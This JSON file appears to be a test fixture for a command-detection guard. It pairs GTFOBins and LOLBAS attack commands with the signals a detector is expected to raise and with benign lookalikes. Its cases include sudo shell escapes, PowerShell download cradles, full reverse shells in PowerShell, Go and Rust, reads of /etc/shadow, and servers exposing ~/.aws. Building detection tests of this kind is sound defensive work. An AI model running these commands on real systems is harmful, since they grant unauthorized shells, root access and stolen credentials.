{
 "_comment": "GTFOBins/LOLBAS enrichment — shell-spawn + sudo privesc LOLBin breakouts. CI guard: each must fire its target_signal. Sourced from gtfobins.github.io via research workflow.",
 "cases": [
  {
   "command": "find . -exec /bin/sh \\; -quit",
   "target_signal": "exec.shell_spawn",
   "_class": "shell_spawn",
   "intent": "find with `-exec` (or `-execdir`/`-ok`) whose argument is a shell (/bin/sh, /bin/bash, sh, bash) rather than a real pred",
   "benign": "`find . -name '*.py'`, `find . -type f -exec grep -l TODO {} \\;`, `find . -exec chmod 644 {} +`, `find /var/log -mtime +"
  },
  {
   "command": "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
   "target_signal": "exec.shell_spawn",
   "_class": "shell_spawn",
   "intent": "GNU tar with `--checkpoint-action=exec=<cmd>` or `--to-command=<cmd>` or `-I '<cmd>'` (use-compress-program), where the ",
   "benign": "`tar czf build.tgz dist/`, `tar xf release.tar.gz -C /opt`, `tar --checkpoint=1000 --checkpoint-action=dot -cf big.tar d"
  },
  {
   "command": "vi -c ':!/bin/sh' /dev/null",
   "target_signal": "exec.shell_spawn",
   "_class": "shell_spawn",
   "intent": "vi/vim/view/rvim launched in batch with `-c` (or `+`) running an ex command that shells out: `:!<cmd>`, `:shell`, `:term",
   "benign": "`vim file.py` (interactive edit, no -c), `vim -c 'set ft=python' notes.txt`, `vim -c 'wq' file` (scripted save), `vim -e"
  },
  {
   "command": "gdb -nx -ex '!/bin/sh' -ex quit",
   "target_signal": "exec.shell_spawn",
   "_class": "shell_spawn",
   "intent": "gdb driven by `-ex`/`-iex`/`-batch`/`-x` to run an inline command that shells out: `-ex '!cmd'` (shell escape), `-ex 'sh",
   "benign": "`gdb -batch -ex 'bt' ./core`, `gdb -p 1234 -batch -ex 'thread apply all bt'`, `gdb --args ./prog arg1` (debug a program)"
  },
  {
   "command": "env /bin/sh",
   "target_signal": "exec.shell_spawn",
   "_class": "shell_spawn",
   "intent": "A pure exec-wrapper (env / nice / nohup / stdbuf / setarch / ionice / taskset / timeout / time / rlwrap / aa-exec / star",
   "benign": "`env NODE_ENV=prod node app.js`, `env -i PATH=/usr/bin make`, `nice -n 19 npm run build`, `nohup ./server &`, `stdbuf -o"
  },
  {
   "command": "xargs -a /dev/null /bin/sh",
   "target_signal": "exec.shell_spawn",
   "_class": "shell_spawn",
   "intent": "xargs run with an EMPTY input source (`-a /dev/null`, or `echo '' | xargs ... -r` defeated, or `xargs ... /bin/sh` with ",
   "benign": "`find . -name '*.o' | xargs rm`, `cat urls.txt | xargs -n1 curl`, `ls *.jpg | xargs -P4 convert`, `xargs -I{} mv {} done"
  },
  {
   "command": "gawk 'BEGIN {system(\"/bin/sh\")}'",
   "target_signal": "exec.shell_spawn",
   "_class": "shell_spawn",
   "intent": "awk/gawk/mawk program whose action calls `system(\"/bin/sh\")` or opens a shell via `print | \"/bin/sh\"` / `\"cmd\" | getline",
   "benign": "`awk '{print $1}' f`, `awk -F, '{sum+=$3} END{print sum}' data.csv`, `awk 'NR>1' file`, `ps aux | awk '/python/{print $2"
  },
  {
   "command": "ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x",
   "target_signal": "exec.shell_spawn",
   "_class": "shell_spawn",
   "intent": "ssh abused for LOCAL shell execution (not a remote login) via `-o ProxyCommand=<cmd>`, `-o LocalCommand=<cmd>` with `-o ",
   "benign": "`ssh user@host`, `ssh -i ~/.ssh/id_ed25519 deploy@prod`, `ssh -o ProxyJump=bastion web01`, `ssh -o ProxyCommand='cloudfl"
  },
  {
   "command": "ed\n!/bin/sh\nq",
   "target_signal": "exec.shell_spawn",
   "_class": "shell_spawn",
   "intent": "Interactive line tools that expose a `!command` shell escape, driven non-interactively: `ed` / `ex` / `nmap --interactiv",
   "benign": "`sqlite3 app.db 'SELECT * FROM users'`, `sqlite3 db .schema`, `nmap -sV -p443 host` (normal scan, no --interactive), `ft"
  },
  {
   "command": "sudo find . -exec /bin/sh \\; -quit",
   "target_signal": "exec.shell_spawn",
   "_class": "privesc",
   "intent": "sudo + find with -exec spawning a shell (/bin/sh, /bin/bash, or an interactive interpreter) instead of a real file opera",
   "benign": "sudo find /var/log -name '*.log' -mtime +30 -delete   (or  sudo find . -name '*.pyc' -exec rm {} \\;) — legit admin searc"
  },
  {
   "command": "sudo vim -c ':!/bin/sh'",
   "target_signal": "exec.shell_spawn",
   "_class": "privesc",
   "intent": "sudo + vim/vi/view/rvim launched with a -c (or +) command that shell-escapes: :!sh, :!/bin/bash, :py import os;os.system",
   "benign": "sudo vim /etc/nginx/nginx.conf   (or  sudo vim -c 'wq' file) — opening a root-owned config to edit; no :! / :py / :lua /"
  },
  {
   "command": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
   "target_signal": "exec.shell_spawn",
   "_class": "privesc",
   "intent": "sudo + awk/gawk/mawk/nawk whose program calls system(\"/bin/sh\") (or pipes \"cmd\" | \"/bin/sh\" / opens /inet/tcp). Standalo",
   "benign": "sudo awk '{print $1}' /var/log/auth.log   (or  awk -F: '{print $1}' /etc/passwd) — field extraction; the program has no "
  },
  {
   "command": "sudo less /etc/profile\n!/bin/sh",
   "target_signal": "exec.shell_spawn",
   "_class": "privesc",
   "intent": "sudo + a pager (less/more/most) driven to a shell: the !cmd bang-escape (!/bin/sh) or the env-trick LESSOPEN='/bin/sh -s",
   "benign": "sudo less /var/log/syslog   (or  sudo less /etc/sudoers) — paging a root-owned file to read it; no '!' bang command and "
  },
  {
   "command": "sudo man -H/bin/sh man",
   "target_signal": "exec.shell_spawn",
   "_class": "privesc",
   "intent": "sudo + man with the -H<cmd> browser hook pointing at a shell (man '-H/bin/sh #' man), or man driving its pager to a !she",
   "benign": "sudo man sudoers   (or  man tar) — reading a manual page; no -H/<shell> hook and the pager is not bang-escaped."
  },
  {
   "command": "sudo env /bin/sh",
   "target_signal": "exec.shell_spawn",
   "_class": "privesc",
   "intent": "sudo env invoked with a shell/interpreter as its command argument (env /bin/sh, env /bin/bash, env sh -p). env's job is ",
   "benign": "sudo env DEBIAN_FRONTEND=noninteractive apt-get install -y nginx   (or  env NODE_ENV=production npm run build) — env use"
  },
  {
   "command": "sudo tar xf /dev/null -I '/bin/sh -c \"/bin/sh 0<&2 1>&2\"'",
   "target_signal": "exec.shell_spawn",
   "_class": "privesc",
   "intent": "sudo + tar with a process-spawning flag: --to-command=/bin/sh, --checkpoint-action=exec=/bin/sh (with --checkpoint=1), o",
   "benign": "sudo tar -xzf /tmp/release.tgz -C /opt/app   (or  sudo tar czf backup.tgz /etc) — ordinary extract/create; no --to-comma"
  },
  {
   "command": "sudo gdb -nx -ex '!/bin/sh' -ex quit",
   "target_signal": "exec.shell_spawn",
   "_class": "privesc",
   "intent": "sudo + gdb driven to a shell via -ex: -ex '!/bin/sh' (bang-escape), -ex 'shell /bin/sh', or -ex 'python import os; os.sy",
   "benign": "sudo gdb -p 4321   (or  sudo gdb --args ./server --config c.yaml) — attaching to / launching a process for real debuggin"
  },
  {
   "command": "sudo mount -o bind /bin/sh /bin/mount\nsudo mount",
   "target_signal": "exec.shell_spawn",
   "_class": "privesc",
   "intent": "sudo mount -o bind <shell> <trusted-suid-or-path> — bind-mounting /bin/sh over a binary that is later run privileged (e.",
   "benign": "sudo mount -o bind /mnt/data /var/www/data   (or  sudo mount /dev/sdb1 /mnt) — a real filesystem/bind mount of a data pa"
  },
  {
   "command": "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh",
   "target_signal": "exec.shell_spawn",
   "_class": "privesc",
   "intent": "sudo + apt/apt-get with an -o config override that injects a hook command: APT::Update::Pre-Invoke / DPkg::Pre-Invoke (o",
   "benign": "sudo apt-get update   (or  sudo apt-get install -y nginx,  sudo apt -o Acquire::http::Proxy=http://proxy:3128 update) — "
  },
  {
   "command": "awk 'BEGIN{system(\"/bin/sh\")}'",
   "target_signal": "exec.shell_spawn",
   "_class": "shell_spawn",
   "intent": "awk/gawk/mawk program whose BEGIN block calls system(\"/bin/sh\") (or system(\"/bin/bash -p\")) to spawn a shell — a sudo/SU",
   "benign": "awk -F, '{sum+=$3} END{print sum}' data.csv — field aggregation; no system()/shell call."
  },
  {
   "command": "vim -c ':py import os; os.system(\"/bin/sh\")'",
   "target_signal": "exec.shell_spawn",
   "_class": "shell_spawn",
   "intent": "vim/view/ex driven non-interactively to spawn a shell or run code: `vim -c ':!/bin/sh'`, `vim -c ':py import os; os.syst",
   "benign": "vim -c ':wq' notes.txt or `vim -es -c ':%s/old/new/g' -c ':wq' file` — scripted edit/substitute-and-save; -c present but"
  },
  {
   "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://attacker/a.sct\")",
   "target_signal": "exec.windows_lolbin",
   "_class": "windows_lolbin",
   "intent": "rundll32 invoked with a `javascript:` / `vbscript:` URI moniker or `,RunHTMLApplication` / `GetObject(\"script:...\")` — u",
   "benign": "rundll32.exe shell32.dll,Control_RunDLL desk.cpl or rundll32 printui.dll,PrintUIEntry — invoking a real exported entry p"
  },
  {
   "command": "rundll32.exe url.dll,OpenURL \"C:\\payload.hta\"",
   "target_signal": "exec.windows_lolbin",
   "_class": "windows_lolbin",
   "intent": "rundll32 calling url.dll/ieframe.dll exports (OpenURL / FileProtocolHandler / OpenURLA) or shell32.dll,ShellExec_RunDLL ",
   "benign": "rundll32 shell32.dll,Control_RunDLL or an installer calling a vendor DLL export to register a component — uses a real fu"
  },
  {
   "command": "msbuild.exe C:\\users\\public\\payload.xml",
   "target_signal": "exec.windows_lolbin",
   "_class": "windows_lolbin",
   "intent": "msbuild handed a .xml/.csproj/.proj that contains an inline `<Task>`/`CodeTaskFactory`/`Microsoft.Build.Tasks.CodeTaskFa",
   "benign": "msbuild MyApp.sln or msbuild MyApp.csproj /p:Configuration=Release run from a real source tree by a dev/CI — a normal pr"
  },
  {
   "command": "InstallUtil.exe /logfile= /LogToConsole=false /U C:\\temp\\payload.dll",
   "target_signal": "exec.windows_lolbin",
   "_class": "windows_lolbin",
   "intent": "InstallUtil run with `/logfile= /LogToConsole=false /U <dll/exe>` — the /U (uninstall) path executes the assembly's atta",
   "benign": "installutil MyWindowsService.exe — a developer/admin registering a real .NET service installer (Install, not /U-with-sup"
  },
  {
   "command": "wmic.exe process call create \"powershell -nop -w hidden -c IEX(...)\"",
   "target_signal": "exec.windows_lolbin",
   "_class": "windows_lolbin",
   "intent": "wmic `process call create \"<cmd>\"` spawns an arbitrary process via the WMI provider (bypasses some process-creation moni",
   "benign": "wmic process list brief / wmic logicaldisk get size,freespace / wmic os get caption — read-only inventory queries used b"
  },
  {
   "command": "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker/a.ps1')\"",
   "target_signal": "exec.windows_lolbin",
   "_class": "windows_lolbin",
   "intent": "PowerShell download-cradle: `IEX`/`Invoke-Expression` fed a `(New-Object Net.WebClient).DownloadString(...)` / `Invoke-W",
   "benign": "powershell -File C:\\scripts\\backup.ps1 or Invoke-WebRequest -OutFile pkg.zip https://repo/... — running a saved script o"
  },
  {
   "command": "conhost.exe --headless powershell -nop -c IEX(...)",
   "target_signal": "exec.windows_lolbin",
   "_class": "windows_lolbin",
   "intent": "conhost used as an execution proxy — `conhost.exe <command>` (esp. `--headless`) launches the target with conhost as the",
   "benign": "There is essentially no benign command-line invocation of conhost with arguments — the OS auto-launches conhost.exe as t"
  },
  {
   "command": "msiexec /q /i http://attacker/payload.msi",
   "target_signal": "exec.windows_lolbin",
   "_class": "windows_lolbin",
   "intent": "msiexec installing a REMOTE/renamed .msi silently (`/q` or `/qb`/`/quiet` + `/i http(s)://...`) or registering a DLL via",
   "benign": "msiexec /i C:\\Installers\\VendorApp.msi or msiexec /x {GUID} /qn — installing/uninstalling a real local vendor package or"
  },
  {
   "command": "cmstp.exe /ni /s C:\\users\\public\\payload.inf",
   "target_signal": "exec.windows_lolbin",
   "_class": "windows_lolbin",
   "intent": "cmstp with `/ni /s <inf>` silently installs a Connection-Manager .INF whose UnRegisterOCXSection runs a .SCT via scrobj.",
   "benign": "An admin/VPN client deploying a legitimate Connection Manager profile, e.g. cmstp.exe \"CorpVPN.inf\" launched interactive"
  },
  {
   "command": "ScriptRunner.exe -appvscript \\\\attacker\\share\\payload.cmd",
   "target_signal": "exec.windows_lolbin",
   "_class": "windows_lolbin",
   "intent": "ScriptRunner.exe `-appvscript <exe|cmd>` executes an arbitrary executable/cmd (incl. a remote SMB/UNC path) as a child o",
   "benign": "On a genuine App-V (Application Virtualization) host, ScriptRunner is invoked by the App-V client itself to run a packag"
  },
  {
   "command": "pcalua.exe -a C:\\users\\public\\payload.exe",
   "target_signal": "exec.windows_lolbin",
   "_class": "windows_lolbin",
   "intent": "pcalua (Program Compatibility Assistant) used as a launcher: `-a <exe|dll|cpl>` runs an arbitrary binary as a child of p",
   "benign": "Windows itself launches pcalua.exe automatically when the Program Compatibility Assistant offers to re-run an old instal"
  },
  {
   "command": "wuauclt.exe /UpdateDeploymentProvider C:\\temp\\payload.dll /RunHandlerComServer",
   "target_signal": "exec.windows_lolbin",
   "_class": "windows_lolbin",
   "intent": "wuauclt (Windows Update client) abused for DLL proxy execution: `/UpdateDeploymentProvider <dll> /RunHandlerComServer` l",
   "benign": "wuauclt /detectnow or wuauclt /reportnow — admins/scripts triggering a Windows Update scan/report cycle; these classic s"
  },
  {
   "command": "telnet 10.0.0.1 8080 | /bin/sh | telnet 10.0.0.1 8081",
   "target_signal": "c2.reverse_shell",
   "_class": "reverse_shell",
   "intent": "Double-telnet reverse shell: two telnet connections to attacker (one for stdin, one for stdout) joined by a shell in the",
   "benign": "telnet smtp.example.com 25 (manual SMTP probe), telnet 192.168.1.1 (router login), telnet localhost 6379 (poke a Redis p"
  },
  {
   "command": "xterm -display 10.0.0.1:1",
   "target_signal": "c2.reverse_shell",
   "_class": "reverse_shell",
   "intent": "X11 reverse shell: `xterm -display ATTACKER_IP:N` forces xterm to render against the attacker's X server (listening on T",
   "benign": "xterm (local terminal), xterm -bg black -fg white, xterm -e 'vim file' (run a command locally), or DISPLAY=:0 inside a d"
  },
  {
   "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendbyte=([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
   "target_signal": "c2.reverse_shell",
   "_class": "reverse_shell",
   "intent": "The canonical Nishang/PowerShell TCPClient reverse shell: `New-Object System.Net.Sockets.TCPClient(host,port)` + `GetStr",
   "benign": "New-Object System.Net.WebClient (download), New-Object PSObject, New-Object System.Net.Sockets.TcpListener (a server, di"
  },
  {
   "command": "powercat -l -p 7002 -ep",
   "target_signal": "c2.reverse_shell",
   "_class": "reverse_shell",
   "intent": "PowerShell bind shell: either powercat in listen+execute-process mode `powercat -l -p PORT -ep` (the `-ep` binds a cmd/p",
   "benign": "powercat -c 127.0.0.1 -p 7002 (client connect mode, no -ep), or New-Object System.Net.Sockets.TCPClient (outbound client"
  },
  {
   "command": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"10.0.0.1:4242\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
   "target_signal": "c2.reverse_shell",
   "_class": "reverse_shell",
   "intent": "Go reverse shell: `net.Dial(\"tcp\", host:port)` to the attacker, then `exec.Command(\"/bin/sh\")` with the connection wired",
   "benign": "net.Dial(\"tcp\", \"db:5432\") (open a DB connection), exec.Command(\"git\",\"status\") (run a tool), client, _ := net.Dial(\"tcp"
  },
  {
   "command": "let s = TcpStream::connect(\"10.0.0.1:4242\").unwrap(); let fd = s.as_raw_fd(); Command::new(\"/bin/sh\").arg(\"-i\").stdin(unsafe { Stdio::from_raw_fd(fd) }).stdout(unsafe { Stdio::from_raw_fd(fd) }).stderr(unsafe { Stdio::from_raw_fd(fd) }).spawn().unwrap().wait().unwrap();",
   "target_signal": "c2.reverse_shell",
   "_class": "reverse_shell",
   "intent": "Rust reverse shell: `TcpStream::connect(host:port)` then the raw socket fd is handed to `Command::new(\"/bin/sh\")` via `S",
   "benign": "TcpStream::connect(\"db:5432\")? (normal client), let stream = TcpStream::connect(addr).await? (async network code). A Tcp"
  },
  {
   "command": "od -An -c -w999 /etc/shadow",
   "target_signal": "cred.read.shadow",
   "_class": "file_read",
   "intent": "GTFOBins file-read/exfil",
   "benign": ""
  },
  {
   "command": "cat /etc/shadow | grep root",
   "target_signal": "cred.read.shadow",
   "_class": "file_read",
   "intent": "GTFOBins file-read/exfil",
   "benign": ""
  },
  {
   "command": "gpg --output - --decrypt ~/.password-store/aws.gpg",
   "target_signal": "cred.read.os_keychain",
   "_class": "file_read",
   "intent": "GTFOBins file-read/exfil",
   "benign": ""
  },
  {
   "command": "python3 -m http.server 8000",
   "target_signal": "egress.adhoc_server",
   "_class": "exfil",
   "intent": "GTFOBins file-read/exfil",
   "benign": ""
  },
  {
   "command": "php -S 0.0.0.0:80",
   "target_signal": "egress.adhoc_server",
   "_class": "exfil",
   "intent": "GTFOBins file-read/exfil",
   "benign": ""
  },
  {
   "command": "python3 -m uploadserver 8000 --directory ~/.aws",
   "target_signal": "egress.adhoc_server",
   "_class": "exfil",
   "intent": "GTFOBins file-read/exfil",
   "benign": ""
  }
 ]
}